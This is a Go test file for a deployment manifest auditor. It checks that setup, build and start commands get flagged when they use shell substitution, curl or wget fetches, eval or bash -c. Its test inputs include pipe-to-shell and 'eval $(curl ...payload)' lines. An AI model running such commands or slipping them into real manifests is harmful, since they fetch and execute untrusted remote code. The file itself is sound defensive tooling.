package manifest_test

import (
	"strings"
	"testing"

	"github.com/Reeteshrajesh/runway/internal/manifest"
)

func TestAudit_Clean(t *testing.T) {
	m := &manifest.Manifest{
		Setup: []string{"npm install", "go mod download"},
		Build: []string{"npm run build", "go build ./..."},
		Start: []string{"./server --port 8080"},
	}
	warns := m.Audit()
	if len(warns) != 0 {
		t.Errorf("expected no warnings for clean manifest, got %d: %v", len(warns), warns)
	}
}

func TestAudit_CommandSubstitution(t *testing.T) {
	m := &manifest.Manifest{
		Setup: []string{"echo $(id)"},
	}
	warns := m.Audit()
	if len(warns) != 1 {
		t.Fatalf("expected 1 warning, got %d", len(warns))
	}
	if warns[0].Field != "setup" {
		t.Errorf("expected field=setup, got %q", warns[0].Field)
	}
	if warns[0].Pattern != "$(" {
		t.Errorf("expected pattern=$( , got %q", warns[0].Pattern)
	}
}

func TestAudit_Backtick(t *testing.T) {
	m := &manifest.Manifest{
		Build: []string{"VERSION=`git rev-parse HEAD`"},
	}
	warns := m.Audit()
	if len(warns) != 1 {
		t.Fatalf("expected 1 warning, got %d", len(warns))
	}
	if warns[0].Pattern != "`" {
		t.Errorf("expected backtick pattern, got %q", warns[0].Pattern)
	}
}

func TestAudit_NetworkFetch(t *testing.T) {
	m := &manifest.Manifest{
		Setup: []string{"curl https://example.com/install.sh | sh"},
	}
	warns := m.Audit()
	if len(warns) != 1 {
		t.Fatalf("expected 1 warning, got %d", len(warns))
	}
	if warns[0].Pattern != "curl " {
		t.Errorf("expected curl pattern, got %q", warns[0].Pattern)
	}
}

func TestAudit_MultipleFields(t *testing.T) {
	m := &manifest.Manifest{
		Setup: []string{"wget http://example.com/tool"},
		Build: []string{"eval $BUILD_CMD"},
		Start: []string{"bash -c 'start.sh'"},
	}
	warns := m.Audit()
	if len(warns) != 3 {
		t.Fatalf("expected 3 warnings (one per field), got %d: %v", len(warns), warns)
	}

	fields := map[string]bool{}
	for _, w := range warns {
		fields[w.Field] = true
	}
	for _, f := range []string{"setup", "build", "start"} {
		if !fields[f] {
			t.Errorf("expected warning for field %q", f)
		}
	}
}

func TestAudit_OnlyOneWarningPerCommand(t *testing.T) {
	// A command with multiple suspicious patterns should produce only 1 warning.
	m := &manifest.Manifest{
		Build: []string{"eval $(curl http://example.com/payload)"},
	}
	warns := m.Audit()
	if len(warns) != 1 {
		t.Errorf("expected exactly 1 warning per command, got %d", len(warns))
	}
}

func TestAuditWarning_String(t *testing.T) {
	w := manifest.AuditWarning{
		Field:   "start",
		Command: "bash -c hack.sh",
		Pattern: "bash -c",
	}
	s := w.String()
	if !strings.Contains(s, "start") {
		t.Errorf("String() should mention field; got %q", s)
	}
	if !strings.Contains(s, "bash -c") {
		t.Errorf("String() should mention pattern; got %q", s)
	}
}
